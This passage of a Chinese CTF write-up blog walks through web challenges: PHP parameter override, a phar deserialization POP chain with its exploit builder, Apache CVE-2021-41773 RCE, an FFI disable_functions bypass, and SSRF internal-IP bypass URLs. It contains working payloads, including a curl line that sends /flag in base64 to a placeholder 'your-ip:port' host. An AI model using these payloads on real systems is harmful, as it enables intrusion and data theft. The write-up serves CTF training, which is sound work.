&#125;<br>       <span class="hljs-comment">// action</span><br>       <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>           <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125; <span class="hljs-keyword">elseif</span> (!function_exists(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>               &#125;<br><br>               <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                   <span class="hljs-variable">$p</span> = [];<span class="hljs-comment">//获取用户设置的变量</span><br>                   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                       <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                           <span class="hljs-variable">$n</span> = intval(substr(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                           <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func_array(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-variable">$rt</span> = call_user_func(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);   <span class="hljs-comment">//rce入口</span><br>                   &#125;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>               &#125;<span class="hljs-keyword">else</span>&#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>               &#125;<br>           <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>               <span class="hljs-keyword">return</span> json_encode(<span class="hljs-keyword">$this</span>-&gt;date);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>显然此时我们有实现命令执行，首先需要覆盖掉函数参数中自带的<code>action=list</code>，于是我们构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?space=admin&amp;mod=whatever action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span></span><br></code></pre></td></tr></table></figure><p>重要的位置我已经加上了注释，在代码执行中，我们成功将<code>system['action']</code>修改为了function，调用phpinfo是因为flag藏在其中（这里也是需要一些运气和经验的），如果我出的话，应该还是会实现rce吧。</p><h2 id="反序列化">7、反序列化</h2><h3 id="安询杯easy_serialize_php字符串逃逸">1、安询杯—easy_serialize_php（字符串逃逸）</h3><h3 id="swpu2021babyunser">2、SWPU2021——babyunser</h3><p>这道题前面大概就是文件上传，在查看界面存在文件包含漏洞，可以直接扒下全部源码。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230331231210292.png" alt="image-20230331231210292" /></p><p>源码一看，发现不让使用常见的伪协议，但是留下了phar协议，而且读取文件内容也非常像是利用phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=strtolower(<span class="hljs-keyword">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不合理&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-keyword">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-keyword">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filter();<br>        <span class="hljs-variable">$contents</span>=file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;content;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br></code></pre></td></tr></table></figure><p>经过分析，利用链大概如下，对部分内容做说明</p><ol type="1"><li>链到zz后，此时可以调用write，var可以设置为content，令filename为ff，这样才能触发__get。此时的var虽然是字符串"content"，但是在PHP中仍然处理为属性content</li><li>调用__get后，传入的参数$key就是ff中的私有属性$content</li><li>ff -&gt; $content设置为zz，由于zz中不存在system的方法，因此触发了__call，传入的参数$name为调用的函数名称，参数就是外部调用的参数（此时为数组形式）</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call<br><span class="hljs-regexp">//</span>                  method=write                   cmd = ls<br><span class="hljs-regexp">//</span>                  var = content   <span class="hljs-keyword">func</span> = system<br></code></pre></td></tr></table></figure><p>最后是构造phar文件，然后利用phar文件触发反序列化实现rce。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    &#125;<br><br><span class="hljs-comment">// aa::_destruct -&gt; zz::__toString -&gt; zz::write -&gt; ff::__get -&gt; zz::__call</span><br><span class="hljs-comment">//                  method=write                   cmd = ls</span><br><span class="hljs-comment">//                  var = content</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> xx();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> ff(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$b</span>-&gt;func = <span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> zz(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> aa(<span class="hljs-variable">$c</span>);<br><br>    <span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$d</span>);<span class="hljs-comment">//自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;flag&quot;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>最后在read.php下利用phar协议完成攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span>=phar://upload/b<span class="hljs-number">80</span>f<span class="hljs-number">81</span>d<span class="hljs-number">26</span>bc<span class="hljs-number">22</span>a<span class="hljs-number">2148</span>aacf<span class="hljs-number">1</span>e<span class="hljs-number">5</span>ff<span class="hljs-number">1</span>dbce.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag<br></code></pre></td></tr></table></figure><h2 id="中间件">8、中间件</h2><h3 id="nssez_rcecve-2021-41773">1、NSS—ez_rce（CVE-2021-41773）</h3><p>打开网页，啥都没有，抓个包发现headers里也没有信息，只能扫一下目录，看看有没有源码/后台/api泄露。</p><p>如果再没有，看看服务器中间件等等有无一些新出的CVE。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /></p><p>看到/cgi-bin，想到之前apache出的cve，检查一下apache的版本2.4.49，基本确定是路径穿越的CVE。</p><p>于是使用rce的payload：</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /></p><p>利用grep找到flag</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /></p><h2 id="php扩展">9、PHP扩展</h2><h3 id="rctf-nextphpffi">1、RCTF-nextphp（FFI）</h3><p>这道题的代码还是非常简单，单刀直入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看phpinfo之后发现经典的disable_function</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /></p><p>蚁剑连接之后，发现没法上传文件，LD_PRELOAD的利用失败了。</p><p>发现同目录下存在preload.php，并且该文件可编辑，也被index.php包含了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [<br>            <span class="hljs-string">&#x27;ret&#x27;</span> =&gt; <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&#x27;func&#x27;</span> =&gt; <span class="hljs-string">&#x27;FFI::cdef&#x27;</span>,<br>            <span class="hljs-string">&#x27;arg&#x27;</span> =&gt; <span class="hljs-string">&#x27;int system(char *command);&#x27;</span><br>        ];<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span> (<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;ret&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;func&#x27;</span>](<span class="hljs-keyword">$this</span>-&gt;data[<span class="hljs-string">&#x27;arg&#x27;</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__serialize</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span> </span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>) </span>&#123;<br>            array_merge(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span> (<span class="hljs-params"></span>): <span class="hljs-title">string</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> serialize(<span class="hljs-keyword">$this</span>-&gt;data);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;data = unserialize(<span class="hljs-variable">$payload</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;run();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>看起来我们的攻击点在run函数，如何利用run函数是一个问题</p><p>这里就引到了PHP的FFI扩展，简单来说就是在PHP中引入C语言的这样一种机制，那么我们就可以利用C语言标准库里的system来绕过disable_function。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br>    <span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="hljs-comment">//由GET传参的任意代码执行</span><br>    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>    @unlink(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上面就是FFI实现RCE攻击的基础代码，当然我们要根据我们的情况进行修改。</p><p>这里主要是两个问题</p><ol type="1"><li>如何构造反序列化链</li><li>如何获取到被赋值的data['ret']</li></ol><p>首先，我们注意到存在两个序列化函数，两者是不同的。</p><ol type="1"><li>__serialize()会先于serialize被调用，最后返回的是数组的序列化结果。</li><li>serialize()返回的是class A的序列化结果。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;<br><span class="hljs-comment">//注意两者的区别</span><br>C:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">89</span>:&#123;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ret&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;FFI::cdef&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;int system(char *command);&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>其次，对于获取到被赋值的data['ret']，最开始的时候我想的是直接修改源代码，将data属性修改为public，但是失败了var_dump查看之后，发现属性仍然为protected，查询了opache.preload，才发现preload.php已经被编译为opcode，我们修改文本是没有意义的。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /></p><p>于是重新构造payload，这回利用__serialize()能够返回data，最后成功构造payload。</p><p>最后是无回显的，当然这已经是小问题了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=unserialize(<span class="hljs-string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>)-&gt;__serialize()[<span class="hljs-string">&#x27;ret&#x27;</span>]-&gt;system(<span class="hljs-string">&#x27;curl http://your-ip:port/`cat /flag | base64`&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="xss">10、XSS</h2><h2 id="ssrf">11、SSRF</h2><h3 id="网鼎ssrfmessrf-攻击redis协议">1、2020网鼎——SSRFMe（SSRF 攻击Redis协议）</h3><p>这道题最开始是一个PHP的一个内网过滤</p><p>先看一下SSRF的实现，经过分析可以得到以下的结论：</p><ol type="1"><li>仅开放了特定的协议，无法使用file协议或者其他PHP伪协议直接读取文件</li><li>增加了对于内网IP的检查</li><li>无法使用302跳转（libcurl默认也不支持302跳转）</li></ol><p>提示可以查看hint.php，那么第一步就是如何绕过内网IP的审查</p><p>方法一：使用libcurl和parse_url的解析差异，构造如下url，这个漏洞在7.4之后的PHP已经修复了。本题无法使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//user:passwd@127.0.0.1@baidu.com/hint.php</span><br></code></pre></td></tr></table></figure><p>方法二：畸形url绕过，构造如下url</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">///127.0.0.1</span><br></code></pre></td></tr></table></figure><p>方法三：使用0.0.0.0绕过，此法仅适用于linux</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0.0.0.0</span><br></code></pre></td></tr></table></figure><p>方法四：DNS重绑定，TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 